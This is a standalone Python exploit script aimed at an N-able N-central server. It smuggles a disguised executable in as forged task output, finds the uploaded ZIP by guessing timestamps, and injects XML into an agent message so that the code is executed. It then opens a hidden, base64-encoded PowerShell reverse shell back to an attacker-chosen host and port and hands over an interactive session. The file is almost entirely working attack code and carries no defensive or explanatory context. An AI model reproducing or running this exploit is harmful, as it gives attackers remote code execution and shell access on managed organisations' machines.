#!/usr/bin/env python3
import argparse
import base64
import html
import io
import re
import time
import zipfile
from datetime import timedelta
from email.utils import parsedate_to_datetime
from pathlib import Path

import requests
import urllib3
from pwn import context, listen


def clean_name(value):
    value = re.sub(r'[,/\\\s+\x00-\x1f\x7f]', '', value)
    data = value.encode()
    while len(data) > 99:
        value = value[:-1]
        data = value.encode()
    return value


def make_zip(mode, host, port, command):
    config = '\n'.join((mode, host, str(port), base64.b64encode(command.encode()).decode())) + '\n'
    meta = '''<?xml version="1.0" encoding="utf-8"?>
<CodeDropMeta>
  <CodeDropID>ServiceUpdate</CodeDropID>
  <BackupLocation><Agent></Agent><Probe>ServiceBackup</Probe></BackupLocation>
  <Shutdown><Agent>false</Agent><Probe>true</Probe></Shutdown>
  <Files>
    <File Name="wsp.exe" CheckRevision="false"><Locations><Location>Windows Software Probe\\bin</Location></Locations></File>
    <File Name="service.cfg" CheckRevision="false"><Locations><Location>Windows Software Probe\\bin</Location></Locations></File>
  </Files>
  <TemporaryFiles><CopyTo></CopyTo><Delete>false</Delete></TemporaryFiles>
  <Bugs />
</CodeDropMeta>
'''
    loader = Path(__file__).with_name('agent_codedrop_service.exe').read_bytes()
    output = io.BytesIO()
    with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as archive:
        archive.writestr('CodeDropMeta.xml', meta)
        archive.writestr('wsp.exe', loader)
        archive.writestr('service.cfg', config)
    return output.getvalue()


def submit(http, origin, task_id, device_uri, payload):
    encoded = base64.b64encode(payload).decode()
    now = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
    body = (
        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
        'xmlns:m="http://mms2.nobj.nable.com/"><soap:Body><m:RemoteExecutionTaskSubmit>'
        '<m:sessionID>-1</m:sessionID><m:remoteExecutiontaskResults>'
        f'<m:RemoteExecutionTaskID>{task_id}</m:RemoteExecutionTaskID>'
        '<m:Status>Completed</m:Status><m:StatusMessage>Completed</m:StatusMessage>'
        f'<m:DeviceResults><m:DeviceURI>{html.escape(device_uri)}</m:DeviceURI>'
        '<m:Status>Completed</m:Status><m:Message>Completed</m:Message>'
        '<m:Username>system</m:Username>'
        f'<m:Start_time>{now}</m:Start_time><m:Finish_time>{now}</m:Finish_time>'
        '<m:Return_code>0</m:Return_code><m:Limited_output>Completed</m:Limited_output>'
        f'<m:Output_capture_file>{encoded}</m:Output_capture_file>'
        '</m:DeviceResults></m:remoteExecutiontaskResults></m:RemoteExecutionTaskSubmit>'
        '</soap:Body></soap:Envelope>'
    )
    return http.post(
        origin.rstrip('/') + '/dms2/services2/ServerMMS2',
        data=body,
        headers={'Content-Type': 'application/soap+xml; charset=UTF-8'},
        timeout=60,
    )


def carrier(http, origin, response, customer_id, device_id, task_id, task_name, device_name, offset, payload):
    moment = parsedate_to_datetime(response.headers['Date']) + timedelta(hours=offset)
    prefix = f'scheduled_tasks/output_files/{customer_id}/{device_id}/{task_id}/'
    left = clean_name(task_name)
    right = clean_name(device_name)
    candidates = []
    for seconds in range(-15, 16):
        stamp = (moment + timedelta(seconds=seconds)).strftime('%Y%m%d%H%M%S')
        candidates.append(prefix + f'{left}_{right}_{stamp}.zip')
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        for name in candidates:
            result = http.get(origin.rstrip('/') + '/download/' + name, timeout=15)
            if result.status_code == 200 and result.content == payload:
                return name
        time.sleep(0.4)
    raise RuntimeError('uploaded ZIP was not found')


def injected_context(path):
    inserted = (
        '<messagecontext><messageid>10</messageid><name>CodeDrop</name><parameters><count>1</count>'
        f'<parameter><name>downloadDir</name><value type="string">{html.escape(path)}</value></parameter>'
        '</parameters></messagecontext>'
    )
    tail = (
        '<messagecontext><messageid>999</messageid><name>Tail</name><parameters><count>1</count>'
        '<parameter><name>body</name><value type="string">'
    )
    return '</value></parameter></parameters></messagecontext>' + inserted + tail


def inject(http, origin, appliance_id, path):
    body = html.escape(injected_context(path))
    request = f'''<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:m="http://www.n-able.com/mickey" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<soapenv:Body><m:GenericAgentXMPPMessageExchange soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SessionID xsi:type="xsd:int">-1</SessionID><ApplianceID xsi:type="xsd:int">{appliance_id}</ApplianceID>
<Subject xsi:type="xsd:string">PierDetailsExchange</Subject><Body xsi:type="xsd:string">{body}</Body>
<ResponseTimeout xsi:type="xsd:int">2000</ResponseTimeout>
</m:GenericAgentXMPPMessageExchange></soapenv:Body></soapenv:Envelope>'''
    try:
        http.post(
            origin.rstrip('/') + '/dms/services/ServerUI',
            data=request,
            headers={'Content-Type': 'text/xml; charset=UTF-8', 'SOAPAction': '""'},
            timeout=20,
        )
    except requests.ReadTimeout:
        pass


def shell_command(host, port):
    script = (
        f"$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();"
        "$b=New-Object byte[] 65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
        "$o=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($o,0,$o.Length);$s.Flush()};$c.Close()"
    )
    encoded = base64.b64encode(script.encode('utf-16le')).decode()
    return 'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ' + encoded


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', default='https://n-central.local')
    parser.add_argument('--appliance-id', type=int, required=True)
    parser.add_argument('--task-id', type=int, required=True)
    parser.add_argument('--customer-id', type=int, required=True)
    parser.add_argument('--device-id', type=int, required=True)
    parser.add_argument('--device-uri', required=True)
    parser.add_argument('--task-name', required=True)
    parser.add_argument('--device-name', required=True)
    parser.add_argument('--server-offset', type=float, default=-5)
    parser.add_argument('--command', default='whoami')
    parser.add_argument('--callback-host')
    parser.add_argument('--callback-port', type=int, default=18481)
    parser.add_argument('--lhost')
    parser.add_argument('--lport', type=int, default=4444)
    parser.add_argument('--listen-host', default='0.0.0.0')
    args = parser.parse_args()
    reverse = bool(args.lhost)
    if not reverse and not args.callback_host:
        parser.error('--callback-host is required unless --lhost is used')
    host = args.lhost if reverse else args.callback_host
    port = args.lport if reverse else args.callback_port
    command = shell_command(host, port) if reverse else args.command
    mode = 'shell' if reverse else 'command'
    context.log_level = 'error'
    receiver = listen(port, bindaddr=args.listen_host, timeout=360)
    payload = make_zip(mode, host, port, command)
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    http = requests.Session()
    http.verify = False
    response = submit(http, args.target, args.task_id, args.device_uri, payload)
    if response.status_code != 200 or '<Msg>Ok</Msg>' not in response.text or 'MalformedTaskList' in response.text:
        raise RuntimeError(f'upload failed: {response.status_code} {response.text[:500]}')
    path = carrier(http, args.target, response, args.customer_id, args.device_id,
        args.task_id, args.task_name, args.device_name, args.server_offset, payload)
    print(f'upload={response.status_code}')
    print(f'carrier={path}')
    inject(http, args.target, args.appliance_id, path)
    print('inject=sent')
    connection = receiver.wait_for_connection()
    if connection is None or receiver.sock is None:
        raise RuntimeError('callback was not received')
    if reverse:
        receiver.interactive()
    else:
        print(receiver.recvall(timeout=10).decode(errors='replace').strip())
    time.sleep(12)


if __name__ == '__main__':
    main()
